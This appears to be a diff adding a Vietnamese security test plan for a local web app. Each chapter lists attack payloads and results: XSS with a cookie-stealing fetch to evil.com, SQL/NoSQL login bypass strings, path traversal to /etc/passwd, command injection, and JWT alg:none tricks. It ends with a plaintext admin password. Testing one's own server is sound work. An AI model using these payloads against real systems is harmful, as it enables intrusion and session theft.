@@ -1,0 +1,90 @@
+=== KẾ HOẠCH TEST BẢO MẬT ===
+Server: http://localhost:5000
+UI Test: http://localhost:5000/api-tester
+
+========================================
+CHƯƠNG 1 - TỔNG QUAN BẢO MẬT WEB
+========================================
+Các lỗ hổng: Injection, XSS, CSRF, Broken Authentication,
+Sensitive Data Exposure, Security Misconfiguration, SSRF
+=> Test ở tất cả chương bên dưới.
+
+========================================
+CHƯƠNG 2 - HTML INJECTION
+========================================
+Tab: HTML Injection
+Test: POST /api/products với payload HTML
+Payload: <h1>INJECTED</h1><img src=x onerror=alert('XSS')>
+Kết quả: Server dùng stripHtml() - an toàn
+
+========================================
+CHƯƠNG 3 - XSS (CROSS-SITE SCRIPTING)
+========================================
+Tab: XSS
+- Reflected XSS: GET /api/products?search=<script>alert('XSS')</script>
+- Stored XSS: POST /api/products với tên chứa script
+Payload: <script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>
+Kết quả: JSON response - không thực thi script
+
+========================================
+CHƯƠNG 4 - SQL INJECTION
+========================================
+Tab: SQL Injection
+1. Bypass login: admin' OR '1'='1
+2. NoSQL Injection: {"email":{"$ne":""},"password":{"$ne":""}}
+Kết quả: Server dùng JSON file + bcrypt - an toàn
+
+========================================
+CHƯƠNG 5 - AUTHENTICATION VULNERABILITIES
+========================================
+Tab: Auth Vulnerabilities
+1. Weak password: Register với pass < 4 ký tự
+2. Brute force: Thử danh sách password phổ biến
+3. Credential stuffing: Dùng email/pass rò rỉ
+4. Rate limit: 10 lần/15ph cho /api/auth/login và /api/auth/register
+
+========================================
+CHƯƠNG 6 - SESSION & COOKIE SECURITY
+========================================
+Tab: Session & Cookie
+1. Session hijacking: Dùng token người khác gọi API
+2. Expired token: Dùng token hết hạn gọi /api/auth/me
+JWT hết hạn sau 1 ngày, có trong header Authorization
+
+========================================
+CHƯƠNG 8 - CSRF (CROSS-SITE REQUEST FORGERY)
+========================================
+Tab: CSRF
+1. GET-based: Tạo link <img> tới API xóa
+2. POST-based: Gửi form tới API tạo/spam
+Server dùng JWT trong header nên khó bị CSRF hơn
+
+========================================
+CHƯƠNG 9 - FILE UPLOAD SECURITY
+========================================
+Tab: File Upload
+Server chưa có endpoint upload file.
+Các lỗ hổng cần test nếu có: webshell, MIME spoofing, extension bypass
+
+========================================
+CHƯƠNG 10 - PATH TRAVERSAL & COMMAND INJECTION
+========================================
+Tab: Path Traversal & Command Injection
+1. Path traversal: ../../../etc/passwd
+2. Command injection: ; ls -la / | dir
+Server không có endpoint dùng đường dẫn file từ user
+
+========================================
+CHƯƠNG 12 - API & JWT SECURITY
+========================================
+Tab: API & JWT Security
+1. Missing auth: GET /api/users/all (không token)
+2. BOLA: GET /api/orders/all (token user thường)
+3. JWT none algorithm: JWT với alg:"none"
+4. JWT secret yếu: Nếu .env dùng secret như "secret" hoặc "123"
+
+========================================
+THÔNG TIN TÀI KHOẢN
+========================================
+Admin: admin / admin123456
+User thường: Đăng ký mới qua tab Authentication
